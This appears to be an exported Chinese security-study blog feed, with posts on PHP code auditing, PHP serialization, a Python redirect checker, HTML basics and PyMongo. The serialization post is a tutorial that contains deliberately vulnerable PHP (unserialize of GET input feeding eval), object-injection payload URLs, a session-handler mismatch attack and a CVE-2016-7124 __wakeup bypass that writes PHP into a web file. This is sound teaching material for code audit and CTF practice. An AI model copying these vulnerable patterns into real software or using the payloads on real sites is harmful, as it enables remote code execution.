echo &quot;\$first = $first&quot;;
echo &quot;r\n&lt;br /&gt;&quot;;
echo &quot;\$arr[0]=$arr[0]&quot;;
echo &quot;r\n&lt;br /&gt;&quot;;
echo &quot;\$arr[1]=$arr[1]&quot;;
?&gt;
&lt;pre&gt;Array
(
    [first] =&gt; value
    [arr] =&gt; Array
        (
            [0] =&gt; foobar
            [1] =&gt; baz
        )

)
bool(false)
bool(true)
$first = valuer
&lt;br /&gt;$arr[0]=foobarr
&lt;br /&gt;$arr[1]=baz[Finished in 0.1s]
</code></pre><p>列目录</p>
<pre><code>glob()函数依照libc glob()函数使用的规则寻找所有与pattern匹配的文件路径；
&lt;?php
//glob
echo &quot;&lt;pre&gt;&quot;;
print_r(glob(&quot;t*.php&quot;));//匹配t开头的
?&gt;
</code></pre>]]></content>
      
        
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[代码审计知识储备]]></title>
      <url>http://yoursite.com/2016/10/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9F%A5%E8%AF%86%E5%82%A8%E5%A4%87/</url>
      <content type="html"><![CDATA[<h3 id="一．-漏洞挖掘"><a href="#一．-漏洞挖掘" class="headerlink" title="一．    漏洞挖掘"></a>一．    漏洞挖掘</h3><p>1.1危险的来源数据<br>显示输入：所有提交的变量都被php保存在了一些数组里，PHP中可由用户用户输入的变量列表如下：</p>
<ul>
<li>$_SERVER –服务器和执行环境（是一个包含了诸如头信息，路径，以及脚本位置等等信息的数组</li>
<li>$_FIES-HTTP文件上传变量</li>
<li>$_ENV-环境变量（通过环境方式传递给当前脚本的变量数组）<br>getenv-获取一个环境变量  string getenv(string $varname)<br>在 php 的设置里有这么个选项register_globals,当这个选项为 on 的时候,上面出现的那些变量都会成为$GLOBALS 中的一员,在脚本中都不需要再取得就可以直接使用,并且以variables_order的顺序覆盖。</li>
<li>$GLOBALS-引用全局作用域中可用的全部变量（一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</li>
<li><a id="more"></a>
</li>
</ul>
<p>很多程序考虑到了register_globals=off的情况，于是在程序化的时候使用如下代码：</p>
<pre><code>@extract(daddslashes($_POST));
@extract(daddslashes($_GET));
</code></pre><ul>
<li>extract-从数组中将变量导入到当前的符号表中</li>
</ul>
<p>注释：把数组内容导入到符合表，比如$_COOLIE[“123”],那么经过他的非法字符过滤后，extract函数后变为$a=”123 ”这样子的模式。<br>daddslashes()-是addslashes()函数的加强版，可以对数组里面的每一个元素添加反斜杠</p>
<p>这些代码起到了register_globals的作用，作用是将post和GET的内容释放出去做全局变量，但是危险可能更大。</p>
<h4 id="二．隐式输入"><a href="#二．隐式输入" class="headerlink" title="二．隐式输入"></a>二．隐式输入</h4><ul>
<li>用户传递的数据-&gt;数据库-&gt;程序代码处理-&gt;程序代码</li>
</ul>
<p>这个模式的意思就是用户输入的可能先进入了数据库，然后程序从数据库再取得这个输入送入某些危险的函数执行。</p>
<p>与存储在数据库中类似的情况是，一些程序把用户的输入放入文件夹中，如缓冲文件，然后在必要的时候从里面取得，如果太过于相信这些地方的变量，这样还是导致问题的。</p>
<h3 id="三．-变量覆盖"><a href="#三．-变量覆盖" class="headerlink" title="三．    变量覆盖"></a>三．    变量覆盖</h3><p>####常见的变量覆盖</p>
<ul>
<li><p>1.extract()-从数组中将变量导入到当前的符号表中</p>
<p>  Int    extract(array    &amp;$var_array[,int$extract_type= EXTR_OVERWRITE [, string $prefix = NULL]] )</p>
</li>
</ul>
<p>本函数用来将变量从数组中导入到当前的符号表中。检查每一个键名看是否可以作为一个合法的变量名，同时检查和符号表中已有的变量名的冲突。<br>$var_array一个关联数组。此函数将键名当作变量名，值作为变量的值<br>$extract_type:对待非法/数字和冲突的键名的方法将根据extract_type的参数决定</p>
<ul>
<li>2.parse_str()-将字符串解析成多个变量<br>void parse_str ( string $str [, array &amp;$arr ] )<br>如果str是URL传递的查询字符串（query string），则将它解析为变量并设置到当前作用域。  参数：str 输入的字符串  arr：若设置了第二个变量arr，变量将会以数组元素的形式存入到这个数组，作为代替</li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> 代码审计  PHP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PPHP序列化以及反序列化]]></title>
      <url>http://yoursite.com/2016/10/18/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A5%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      <content type="html"><![CDATA[<h3 id="什么是序列化以及反序列化"><a href="#什么是序列化以及反序列化" class="headerlink" title="什么是序列化以及反序列化"></a>什么是序列化以及反序列化</h3><p>序列化是将PHP中的值（zval）转换成一段包含字节流的字符串。序列化一个对象会保存为对象中的所有变量的值，但不会保存对象的方法，以及只会保存类的名字。其本质就是将程序以相应的格式保存下来</p>
<p>反序列化：对单一的一序列化的变量进行操作，将其转换回PHP的值。</p>
<a id="more"></a>
<h4 id="PHP序列化方式"><a href="#PHP序列化方式" class="headerlink" title="PHP序列化方式"></a>PHP序列化方式</h4><p>php在序列化的时候会将相应的变量以对应的键值进行存储。</p>
<ul>
<li>实例化对象中自身的二次赋值</li>
<li><p>对象的序列化 O:类名长度:”类名”:值:{}</p>
<p>  &lt;?php</p>
<p>  //1.要创建一个类的实例，必须要使用new关键字  2.用array()语言创建一个数组，它接受任意数量用逗号分割的  键（key） =&gt; 值（value）对</p>
<p>  $o = new stdClass;</p>
<p>  $o-&gt;foo = $o;</p>
<p>  $s = serialize($o);</p>
<p>  print $s;</p>
<p>  //结果： O:8:”stdClass”:1:{s:3:”foo”;r:1;}</p>
<p>  //对象的序列化 O:类名长度:”类名”:值:{}<br>  ?&gt;</p>
</li>
<li><p>数组中的引用(&amp;)的序列化</p>
</li>
<li><p>数组的序列化  array通常被序列化为： a:<n>:{<key1><key 2=""><value 2="">…<key n=""><value n="">}    <n>表示数组元素的个数，<key 1="">、<key 2="">……<key n=""> 表示数组下标，<value 1="">、<value 2="">……<value n=""> 表示与下标相对应的数组元素的值。</value></value></value></key></key></key></n></value></key></value></key></key1></n></p>
<p>  &lt;?php<br>  $a = [“foo”];//数组里的字符串会被当做一个整体对待；</p>
<p>  $a[1] =&amp; $a[0];//  数组中的引用（&amp;）的序列化</p>
<p>  echo $a[1];</p>
<p>  echo “——-“;</p>
<p>  $s = serialize($a);</p>
<p>  echo $s;</p>
</li>
</ul>
<pre><code>//结果：  a:2:{i:0;s:3:&quot;foo&quot;;i:1;R:2;}
//这里的R:2；部分意味着“指向第二个值”什么是第二个值？整个数组代表第一个值，(s:3:&quot;foo&quot;)代表第二个值
//
?&gt;
</code></pre><h3 id="序列化键名对照表"><a href="#序列化键名对照表" class="headerlink" title="序列化键名对照表"></a>序列化键名对照表</h3><pre><code>数组中二次赋值（&amp;） ：            R；
对象的二次赋值：                 r；
NULL：                          N；
ture：                         b:1;
false:                        b:0;
Long:                          i;
Double:                        d;
String:                        s/S;
Class:                         C;
Array:                         a;
Object:                        O;
变量的不同属性也有着不同的格式：
public：                       key;
protected：                    \0*\0key;
private:                       \0key\0;
</code></pre><h3 id="实例观察public-protected-private的区别"><a href="#实例观察public-protected-private的区别" class="headerlink" title="实例观察public/protected/private的区别"></a>实例观察public/protected/private的区别</h3><pre><code>&lt;?php
class Test {
public $public = 1;
protected $protected = 2;
private $private = 3;
}
$a = new Test();
$s = serialize($a);
//echo &quot;$s&quot;;
var_dump($s);//var_dump()会返回变量的数据类型和值

//结果：  string(81) &quot;O:4:&quot;Test&quot;:3:{s:6:&quot;public&quot;;i:1;s:12:&quot;\000*\000protected&quot;;i:2;s:13:&quot;\000Test\000private&quot;;i:3;}&quot;
?&gt;
</code></pre><p>###String对应的两个键：s与S<br>serialize()和unserialize()处理有着一些差异。PHP源码serialize()中没有相关序列化是以S为标识的，但是在unserialize中又有对S键的相关处理，相关部分源码</p>
<pre><code>&lt;?  php
case &apos;S&apos;: goto yy10;
...
yy10:
yych = *(YYMARKER = ++YYCURSOR);
if (yych == &apos;:&apos;) goto yy39;
goto yy3;
...
yy39:
yych = *++YYCURSOR;
if (yych == &apos;+&apos;) goto yy40;
if (yych &lt;= &apos;/&apos;) goto yy18;
if (yych &lt;= &apos;9&apos;) goto yy41;
goto yy18;

case &apos;s&apos;: goto yy9;
...
yy9:
yych = *(YYMARKER = ++YYCURSOR);
if (yych == &apos;:&apos;) goto yy46;
goto yy3;
...
yy46:
yych = *++YYCURSOR;
if (yych == &apos;+&apos;) goto yy47;
if (yych &lt;= &apos;/&apos;) goto yy18;
if (yych &lt;= &apos;9&apos;) goto yy48;
goto yy18;
...
...
?&gt;
</code></pre><p>如果细心地话，会发现s和S就会发现两个键的处理方式是一模一样的</p>
<h3 id="PHP中SESSION反序列化机制"><a href="#PHP中SESSION反序列化机制" class="headerlink" title="PHP中SESSION反序列化机制"></a>PHP中SESSION反序列化机制</h3><h4 id="1-简介"><a href="#1-简介" class="headerlink" title="1 简介"></a>1 简介</h4><pre><code>在php.ini中存在的三项配置项
1.session.save_path=&quot;&quot; --设置session的存储路径
2.session.save_handler=&quot;&quot; --设置用户自定义存储函数，若想使用PHP内置会话存储机制之外的可以使用本函数（数据库等方式）
3.session.auto_start boolen --指定会话模块是否在请求开始时自动启动一个会话。默认为0
4.session.serialize_handler string --定义用来序列化/反序列化的处理器名字。默认为php
以上具体选项就是PHP中的session存储和序列话存储相关的选项
</code></pre><p>在使用xampp组件安装中，上述的配置项的设置如下：</p>
<pre><code>1.session.save_path=&quot;D:\phpstudy\tmp\tmp&quot;    表明所有的session文件都是存储在xampp/tmp下
2.session.save_handler=&quot;file&quot;     表名session是以文件的方式进行存储的
3.session.auto_start=0            表明默认不启动session
4.session.serialize_handler=php   表明session的默认序列话引擎使用的是php序列话引擎
</code></pre><p>在上述配置中，session.serialize_handler是用来设置session的序列话引擎，出除了默认的php引擎外还有其它的引擎，不同的引擎对应的session的存储方式不同</p>
<pre><code>A：php_binary:存储方式，键名的长度对应的ASCII字符+键名+经过serialize函数序列化处理的值
B：php存储的方式 ： 键名+竖线+经过serialize函数序列化处理的值
C：php_serialize(php&gt;5.5.4)存储方式，经过serialize函数处理的值
</code></pre><p>在php中默认使用的PHP引擎，如果修改为其他的引擎，只需要添加代码ini_set(“session.serialize_handler”,”需要设置的引擎”.示例代码如下：</p>
<pre><code>&lt;?php
ini_set(&quot;session.serialize_handler&quot;,&quot;php_serialize&quot;);
session_start;
//do something
?&gt;
</code></pre><h4 id="2-存储机制"><a href="#2-存储机制" class="headerlink" title="2 存储机制"></a>2 存储机制</h4><p>php中的session中的内容并不是放在内存中，而是以文件的方式来存储，存储的方式也是由配置项session.save_handler来确定，默认是以文件的形式存储。 文件的内容就是session值得序列化之后的内容。</p>
<p>若我们的环境是xampp，在默认的配置下：</p>
<pre><code>&lt;?php
session_start();
$_SESSION[&quot;name&quot;]=&quot;spoock&quot;;
var_dump();
?&gt;
</code></pre><p>最后的session的存储和显示如下：<br><img src="http://i1.piimg.com/567571/d4ce737799055b86.png" alt=""><br>可以看到PHPSESSID的值是jo86ud4jfvu81mbg28sl2s56c2，而在xampp/tmp下存储的文件名是sess_jo86ud4jfvu81mbg28sl2s56c2，文件的内容是name|s:6:”spoock”;。name是键值，s:6:”spoock”;是serialize(“spoock”)的结果。</p>
<p>在php_serialize引擎中</p>
<pre><code>&lt;?php
ini_set(&quot;session.serialize_handler&quot;, &quot;php_serialize&quot;);
session_start();
$_SESSION[&quot;name&quot;] = &quot;spoock&quot;;
var_dump();
?&gt;
</code></pre><p>session文件中的内容 a:1:{s:4:”name”;s:6:”spoock”},a:1是使用php_serialize都会加上。同时使用php_serialize会将session中的key和value都会序列化。</p>
<p>在php_binary引擎中：</p>
<pre><code>&lt;?php
ini_set(&quot;session.serialize_handler&quot;,&quot;php_binary&quot;)
session_start();
$_SESSION[&quot;name&quot;] = &quot;spoock&quot;
var_dump();
?&gt;
</code></pre><p>session文件中的内容是EOTname:6:”spoock”;由于name的长度为4,4在ASCII表中对应的值就是EOT。根据php_binary的存储规则，最后就是EOTname:6:”spoock”；ASCII的值为4的字符无法在网页上面显示。</p>
<h4 id="3-序列化的简单运用"><a href="#3-序列化的简单运用" class="headerlink" title="3 序列化的简单运用"></a>3 序列化的简单运用</h4><h5 id="补习php中-this-gt"><a href="#补习php中-this-gt" class="headerlink" title="补习php中$this-&gt;"></a>补习php中$this-&gt;</h5><p>$this的含义表示  实例后的具体对象</p>
<p>我们一般先声明一个类，然后用这个类去实例化对象！<br>    &lt;?php<br>    class User{</p>
<pre><code>    public $name;

    function __getname(){//简言之定义一个类的方法
        echo $this-&gt;name;
    }
}
$user1 = new User();

$user1-&gt;name = &apos;张三&apos;;

$user1-&gt;getName();      //这里就会输出张三！

$user2 = new User();

$user2-&gt;name = &apos;李四&apos;;

$user2-&gt;getName();      //这里会输出李四！
?&gt;
</code></pre><p>运用实例 22.php</p>
<pre><code>&lt;?php
class syclover{
    var $func = &quot;&quot;;//var 定义类的属性为公共，var和public一个意思
    function __construct(){
        $this-&gt;func = &quot;phpinfo()&quot;;//$this 实例化后的具体的对象
    }
    function __wakeup(){
        eval($this-&gt;func);//eval()函数把字符串当做PHP代码执行
    }
}
unserialize($_GET[&quot;a&quot;]);

?&gt;
</code></pre><p>在第11行对传入的参数进行了序列化，我们可以传入一个特定的字符串，反序列化为syclover的一个实例，那么就可以执行eval()的方法。我们访问<br><a href="http://localhost/22.php?a=O:8:&quot;syclover&quot;:1:{s:4:&quot;func&quot;;s:14:&quot;echo" target="_blank" rel="external">http://localhost/22.php?a=O:8:&quot;syclover&quot;:1:{s:4:&quot;func&quot;;s:14:&quot;echo</a> “spoock”;”;}，反序列化得到的内容是：</p>
<pre><code>objict(syclover)[0]
    public &quot;func&quot; =&gt;string &apos;echo &quot;spoock&quot;;&apos;;
</code></pre><p>最后页面输出的就是spoock，说明最后执行啦我们定义的echo “spoock”方法，这就是一个序列化漏洞的具体过程。</p>
<h3 id="4-php-session触发过程的实际应用"><a href="#4-php-session触发过程的实际应用" class="headerlink" title="4 php session触发过程的实际应用"></a>4 php session触发过程的实际应用</h3><p>存在test01.php和test02.php两个文件所使用的session引擎不一样，即机制不同，我们可以在某一页面将数据序列化存放，在另一个页面进行反序列化访问，从而实现类。具体看一下代码<br>test01.php使用php_serialize来处理session</p>
<pre><code>&lt;?php
ini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);
session_start();
$_SESSION[&quot;spoock&quot;]=$_GET[&quot;a&quot;];
?&gt;
</code></pre><p>test02.php使用php来处理session</p>
<pre><code>&lt;?php
ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);
session_start();
class lemon {
var $hi;
function __construct(){
    $this-&gt;hi = &apos;phpinfo();&apos;;
}

    function __destruct() {
         eval($this-&gt;hi);
    }
}
?&gt;
</code></pre><p>当访问的时候提交如下的数据：</p>
<ul>
<li><a href="http://localhost/test01.php?a=|O:5:&quot;lemon&quot;:1:{s:2:&quot;hi&quot;;s:14:&quot;echo" target="_blank" rel="external">http://localhost/test01.php?a=|O:5:&quot;lemon&quot;:1:{s:2:&quot;hi&quot;;s:14:&quot;echo</a> “spoock”;”;}</li>
</ul>
<p>此时传入的数据会按照php_serialize来进行序列化，此时访问<a href="http://localhost/test02.php，页面输出spoock成功执行了我们构造的数据，就会实例化lemon对象，最后会执行析构函数中的eval()方法。" target="_blank" rel="external">http://localhost/test02.php，页面输出spoock成功执行了我们构造的数据，就会实例化lemon对象，最后会执行析构函数中的eval()方法。</a></p>
<h4 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h4><p>1.在实际进行渗透测试或者CTF中遇到session反序列化时，若发现session.upload_progress.enabled开着即等于1时，php会记录上传文件的进度，再上传时将信息保存在$_SESSION中。若文章测试使用如$_SESSION[“ryat”] = $_GET[“ryat”],然而很多时候没有这个条件，<br><a href="http://php.net/manual/zh/session.upload-progress.php" target="_blank" rel="external">session.upload-progress.php</a>,php为我们提供了一个上传进度的数据（当一个上传在处理中，同时POST一个与INI中设置的session.upload_process.name同名变量时，上传进度可以在$_SESSION中获得）即$n = ini_get(“session.upload_progress.nmae);会把它存储在$_SESSION[“$n”]当中，这样我们就可以构造一个文件上传页，就可以成功写入session。</p>
<p>一个上传进度数组的结构的例子</p>
<pre><code>&lt;form action=&quot;upload.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
 &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;ryat&quot; /&gt;
 &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
 &lt;input type=&quot;submit&quot; /&gt;
&lt;/form&gt;
</code></pre><p>2.在PHP中普通的传值赋值行为有一个例外就是碰到object时，在PHP中使用引用赋值的，除非明确使用了clone关键字来拷贝，PHP支持引用来赋值，使用”$var = &amp;$othervar;”语法。引用赋值意味着两个变量指向了一个变量，没有拷贝任何的东西。<br>举个简单地例子：</p>
<pre><code>a = 1;
b = &amp;a;
a = a+1;
由于引用参数，a和b引用的是同一个数据，因此a+1后，b也会变成2.
</code></pre><p>CTF利用：</p>
<pre><code>&lt;?php
class just4fun {
    var $enter;
    var $secret;
}

if (isset($_GET[&apos;pass&apos;])) {
    $pass = $_GET[&apos;pass&apos;];

    if(get_magic_quotes_gpc()){//取得PHP环境变数magic_quotes_gpc的值，当magic_quotes_gpc打开时，所有的单引号，双引号，反斜线and空字符会自动转换为含有反斜线的溢出字符；
        $pass=stripslashes($pass);//stripslashes()函数删除由addslashes()函数添加的反斜杠
    }

    $o = unserialize($pass);

    if ($o) {
        $o-&gt;secret = &quot;*&quot;;
        if ($o-&gt;secret === $o-&gt;enter)
            echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret;
        else
            echo &quot;Oh no... You can&apos;t fool me&quot;;
    }
    else echo &quot;are you trolling?&quot;;
}
?&gt;
</code></pre><p>我们构造访问<a href="http://localhost/serializeTest.php?pass=O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;}" target="_blank" rel="external">http://localhost/serializeTest.php?pass=O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;}</a><br>顺利输出Congratulation! Here is my secret: *</p>
<h3 id="5-CVE-2016-7124反序列化漏洞"><a href="#5-CVE-2016-7124反序列化漏洞" class="headerlink" title="5 CVE-2016-7124反序列化漏洞"></a>5 CVE-2016-7124反序列化漏洞</h3><p>漏洞概述：</p>
<p>SugarCRM（<a href="http://www.sugarcrm.com/" target="_blank" rel="external">http://www.sugarcrm.com/</a> ）是一套开源的客户关系管理系统。在其&lt;=6.5.23的版本中存在序列化漏洞，程序对攻击者恶意构造的序列化数据进行了反序列化的处理，从而使攻击者可以在未授权的情况下中兴任意的代码。</p>
<pre><code>对于此漏洞简单来说就是当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行
</code></pre><p>知识储备：</p>
<ul>
<li>unserialize()函数会检查勒种是否存在一个魔术方法<strong>wakeup方法，若存在会先调用</strong>wakeup方法，预先准备对象需要的资源</li>
<li>__wakeup()方法经常用在反序列化的操作中，例如重新建立数据库的连接，或建立其它初始化操作</li>
<li>get_object__var()函数返回由对象属性创建的关联数组。</li>
</ul>
<p>具体测试代码：</p>
<pre><code>&lt;?php
class A{
    var $a = &quot;test&quot;;
    function __destruct(){
        $fp = fopen(&quot;D:\\phpStudy\\WWW\\hello.php&quot;,&quot;w&quot;);
        fputs($fp,$this-&gt;a);
        fclose($fp);
    }

    function __wakeup()
        {    
            foreach(get_object_vars($this) as $k =&gt; $v) {
                    $this-&gt;$k = null;
            }
            echo &quot;Waking up...\n&quot;;
        }
}
$test = $_POST[&apos;test&apos;];
$test_unser = unserialize($test);
?&gt;
</code></pre><p>使用payload进行测试，结果如下：<br><img src="http://7xrn7f.com1.z0.glb.clouddn.com/16-10-27/50125046.jpg" alt=""><br>发现__wakeup函数成功执行，消除了对象属性，从而hello.php内容也没空。</p>
<p>漏洞证明：</p>
<p>我们将上面的test=O:1:”A”:1:{s:1:”a”;s:18:”&lt;?php phpinfo();?&gt;”;}中的A的个数变成2或者大于2的数字如下：</p>
<pre><code>test=O:1:”A”:2:{s:1:”a”;s:18:”&lt;?php phpinfo();?&gt;”;}
</code></pre><p>然后在执行就会发现绕过了__wakeup函数，成功将phpinfo()写入到hello.php<br><img src="http://7xrn7f.com1.z0.glb.clouddn.com/16-10-27/95172433.jpg" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python3 检测URL重定向到的地址]]></title>
      <url>http://yoursite.com/2016/10/16/python3-%E6%A3%80%E6%B5%8BURL%E9%87%8D%E5%AE%9A%E5%90%91%E5%88%B0%E7%9A%84%E5%9C%B0%E5%9D%80/</url>
      <content type="html"><![CDATA[<p><img src="http://p1.bqimg.com/567571/61cd6892adab71ed.jpg" alt=""></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 最近一直考虑，如何持续的保持我对python学习的热度，思考是否能够尝试任务自动化，简言之，就是有些繁琐的事情利用脚本来实现。今天我讨论学习的任务是如何检测URL重定向到的地址，遗憾的是对https：//检测没有实现。实现的原理倒是也简单，就是判断站点返回来的status_code判断是否为3xx，若是，则就简单粗暴地人为是重定向，比如一些突发情况，如访问超时，域名解析错误，网络错误等，则利用try…except…来避免，需要检测的大量的url放入到一个文件中，若站点的格式不统一的话，就做一个简单判断<br><a id="more"></a></p>
<h3 id="知识点简单补充"><a href="#知识点简单补充" class="headerlink" title="知识点简单补充"></a>知识点简单补充</h3><ul>
<li>startswith()方法用于检测字符串是否是以指定子字符串开头</li>
<li>strip()方法用于移除字符串头尾指定的字符（默认为空格）。</li>
<li><p>使用列表推导式 </p>
<ol>
<li>x**2 for x in num if x &gt; 0</li>
<li>[one_ture] if [expression] else [on_false]</li>
<li>map(lambda x:x**2,filter(lamber x :x&gt;0,num))</li>
<li><p>i.strip() for i in open(xxx).readlines()</p>
<h3 id="脚本代码"><a href="#脚本代码" class="headerlink" title="脚本代码"></a>脚本代码</h3><p>import sys<br>import requests<br>def check_for_redirects(url):<br> #利用allow_redirects=False<br> r = requests.get(url,allow_redirects = False ,timeout = 0.5)<br> try:</p>
<pre><code>if 300 &lt;= r.status_code &lt;= 400:
    return r.headers[&quot;response&quot;]
else:
    return &quot;[no redirects]&quot;
</code></pre><p> except requests.exceptions.Timeout:</p>
<pre><code>return &quot;[Timeout]&quot;
</code></pre><p> except requests.exceptions.ConnectTimeout:</p>
<pre><code>return &quot;[ConnectTimeout]&quot;
</code></pre><p> except requests.exceptions.SSLError:</p>
<pre><code>return &quot;[SSLError]&quot;
</code></pre><p>def check_domains(urls):<br> for url in urls:</p>
<pre><code>check_url = url if url.startswith(&quot;http&quot;) else &quot;http://{}&quot;.format(url)
redirects_url  = check_for_redirects(check_url)
print(&quot;{}=&gt;{}&quot;.format(check_url,redirects_url))
</code></pre><p>if <strong>name</strong> == “<strong>main</strong>“:<br> all_url = “urls.txt”<br> try:</p>
<pre><code>all_url = sys.argv[1]
</code></pre><p> except IndexError:</p>
<pre><code>pass
</code></pre><p> urls = (i.strip() for i in open(all_url).readlines())<br> check_domains(urls)</p>
</li>
</ol>
</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>最后在多说两句，脚本就定义了两个简单函数，一个是负责结果的返回，一个是文件读取url，有参考别人的地方，具体过程原理一定搞清楚，不然是无从下手去写的，模仿，自己动手，然后才是自己的风格。</p>
]]></content>
      
        
        <tags>
            
            <tag> python运维 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[HTML 20/80关键知识]]></title>
      <url>http://yoursite.com/2016/10/15/HTML-20-80%E5%85%B3%E9%94%AE%E7%9F%A5%E8%AF%86/</url>
      <content type="html"><![CDATA[<h1 id="HTML-20-80关键知识"><a href="#HTML-20-80关键知识" class="headerlink" title="HTML 20/80关键知识"></a>HTML 20/80关键知识</h1><h3 id="1-网页结构"><a href="#1-网页结构" class="headerlink" title="1 网页结构"></a>1 网页结构</h3><ul>
<li>HTML：专注于网页的结构</li>
<li>CSS ：用于修饰网页的样式</li>
<li>Javascript:赋予网页的各种功能（数据存储，通讯，反数据爬取等）<h3 id="2-静态网页的概念"><a href="#2-静态网页的概念" class="headerlink" title="2 静态网页的概念"></a>2 静态网页的概念</h3>拥有HTML和CSS（网页的结构和样式），但没有JavaScript（没有任何数据的传输，比如注册网站或登录后台要传送数据给数据库等）<a id="more"></a>
<h3 id="3-HTML"><a href="#3-HTML" class="headerlink" title="3 HTML"></a>3 HTML</h3>由标签组成，因此是一种标记语言，包含100多种标签，其中最常用的有10中</li>
</ul>
<p><strong><em>标签：</em></strong>一般由开始标签+内容+结束标签组成，如：</p>
<pre><code>&lt;div&gt; hello,word&lt;/div&gt;
</code></pre><p><strong><em>要注意的是，在HTML中，并不是所有的标签都是结束标签</em></strong></p>
<p>比如img标签：</p>
<pre><code>&lt;img src=&quot;images/001.jpg&quot; alt=&quot;蝴蝶兰&quot;&gt;
</code></pre><p><strong><em>搭配的标签</em></strong></p>
<ul>
<li>用class属性把正确的样式赋予标签，用href属性在标签内引入链接</li>
<li>每个标签带有多个属性，其中有必要属性，如img标签的src属性（值为URL，未定显示图像的URL）和alt属性（值为text，规定显示图像的替代文本）</li>
</ul>
<p><strong><em>标签的嵌套</em></strong></p>
<ul>
<li>实质是包含关系</li>
<li>内层标签和外层标签是父子关系</li>
<li>同一层标签是兄弟关系</li>
</ul>
<p><strong><em>网页设计的结构（要与html结构区别开，这是不同的定义）</em></strong></p>
<ul>
<li>Header（布置导航，目录）</li>
<li>Content(文章，博客）</li>
<li>Footer(联系方式等）</li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> python web开发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[在python3中操作MongoDB数据库]]></title>
      <url>http://yoursite.com/2016/10/07/%E5%9C%A8python3%E4%B8%AD%E6%93%8D%E4%BD%9CMongoDB%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      <content type="html"><![CDATA[<p><img src="http://i1.piimg.com/567571/066efee756c1d9e4.jpg" alt=""></p>
<p>首先了解一下MongoDB中存储数据的一些概念<br><img src="http://i1.piimg.com/567571/959fb373e2913f71.png" alt=""><br><a id="more"></a><br>对于数据路的操作无外乎对表的，集合的操作和对数据的操作。在python中进行下面的所有的操作前，都必须有这几条语句：</p>
<pre><code>import pymongo
#与mongodb服务器进行连接
client = pymongo.MongoClient(&apos;localhost&apos;, 27017)
ceshi = client[&apos;ceshi&apos;]  #创建一个名为ceshi的数据库
#若直接连接已有的数据库，类似db = connection[&quot;ganji&quot;]
item_info = ceshi[&apos;item_info&apos;]#建名为item_info的集合（表），同建立数据库形式一样
</code></pre><h3 id="1-id"><a href="#1-id" class="headerlink" title="1 _id"></a>1 _id</h3><p>MongoDB中存储的文档必须有一个”_id”键。这个键的值可以是任何类型的，默认是一个Objectld对象。在一个集合里面，每一个集合都有唯一的”_id”值，来确保集合里面每一个文档都被唯一的标识，如果有两个集合的话，两个集合可以都有一个值为”123”的”_id”的键，但是每一个集合只能有一个”_id”是123的文档。</p>
<h3 id="2-插入、删除、更新记录（文档）"><a href="#2-插入、删除、更新记录（文档）" class="headerlink" title="2 插入、删除、更新记录（文档）"></a>2 插入、删除、更新记录（文档）</h3><pre><code>（1）对建好的集合中插入数据，用insert(),insert_one()函数
    users.insert_one({&quot;url&quot;:item_link})#一般要表前加上数据库的名字
    ceshi.users.insert_one({&quot;url&quot;:item_link})
(2)删除集合中的文档，用remove()函数，删除后的文档无法恢复
    ceshi.user.remove() 表示删除集合里的所有记录
    ceshi.user.remove({&apos;yy&apos;:5}) #表删除yy=5的记录

    id = ceshi.users.find_one({&quot;name&quot;:&quot;user1&quot;})[&quot;_id&quot;]
    ceshi.users.remove(id)#找到name=user1的记录，并根据记录的id删除该记录
（3）更新记录用update()函数
    db.collection.update( criteria, objNew, upsert, multi )
    criteria: 需要被更新的条件表达式（update的查询条件，类似sql update查询内的where后面的）
    objNew: 更新表达式（update的对象和一些更新的操作符（如$,$set..）等
    upsert: 如目标记录不存在，是否插入新文档（默认为false，不插入）
    multi: 是否更新多个文档（默认为false，只更新找到的第一条记录，若为ture，就把按条件查出来的多条记录全部更新）

    ceshi.users.update({&apos;gid&apos;:last_gid, &apos;time&apos;:l_date}, {&apos;$set&apos;:{&apos;gid&apos;:last_gid}, &apos;$set&apos;:{&apos;time&apos;:l_date}, &apos;$addToSet&apos;:{&apos;categories&apos;:category_data}}, upsert=True)
    #上式表示添加&apos;categories&apos;字段到gid=last_gid,time=l_date的这条记录中。
</code></pre><h3 id="3-数据的查询（重点）"><a href="#3-数据的查询（重点）" class="headerlink" title="3 数据的查询（重点）"></a>3 数据的查询（重点）</h3><p>基本上用find()函数进行查询，$lt/$lte/$gt/$gte/$ne，依次等价于&lt; / &lt;= / &gt; / &gt;=/ !=。（l表示less g表示greater e表示equal n表示not  ）</p>
<pre><code>（1）查询显示符合条件的记录
    #查询age小于15的
      for u in ceshi.users.find({&quot;age:{&quot;$lt&quot;:15}):print u
    # 查询 name 等于 user8 的
      for u in ceshi.users.find({&quot;name&quot;:&quot;user8&quot;}): print u

    #获取查询的一个记录（注意用find_one()而不是find())
    u2 = ceshi.users.find_one({&quot;name&quot;:&quot;user9&quot;}) # 查不到时返回 None
    print u2
(2)多条件进行查询
